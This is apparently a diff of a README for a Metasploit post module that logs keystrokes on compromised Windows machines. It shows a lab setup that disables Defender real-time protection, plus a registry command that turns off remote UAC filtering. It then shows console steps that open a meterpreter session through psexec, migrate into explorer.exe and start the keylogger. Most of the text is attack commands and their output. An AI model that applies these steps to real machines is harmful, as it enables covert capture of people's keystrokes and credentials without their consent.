@@ -5,7 +5,7 @@ A Metasploit module that captures keystrokes on compromised Windows machines.
 - Kali Linux virtual machine with Metasploit
 - Windows 10 virtual machine
 
-## Setup
+## Getting Started
 Before attacking, you need to install and make the Windows machine vulnerable. You can find a guide to help you [here](https://medium.com/@bmatth21/how-to-setup-windows-10-vm-lab-for-hacking-608592d550f2).
 
 You also need to disable the Windows Defender real-time protection in `Windows Security > Virus & threat protection > Real-time protection`
@@ -15,7 +15,7 @@ Finally, you need to disable the remote UAC by opening a terminal as administrat
 REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 ```
 
-## Usage
+## How to use
 This a post module so you will have to get access to the Windows machine. You can do it by any means but we will use `windows/smb/psexec` in Metasploit for the demonstration.
 
 First, use psexec to get a session with a valid credential:
@@ -41,3 +41,17 @@ msf exploit(windows/smb/psexec) > run
 
 meterpreter >
 ```
+
+Then, you can background the meterpreter session and run the keylogger:
+```
+msf6 exploit(windows/smb/psexec) > use xtests/big_brogger
+msf6 post(xtests/big_brogger) > set SESSION 1
+SESSION => 1
+msf6 post(xtests/big_brogger) > run
+
+[*] Migrating to explorer.exe...
+[+] Successfully migrated to explorer.exe.
+[*] Keylogger started...
+```
+
+To exit, simply press `Ctrl+C`.
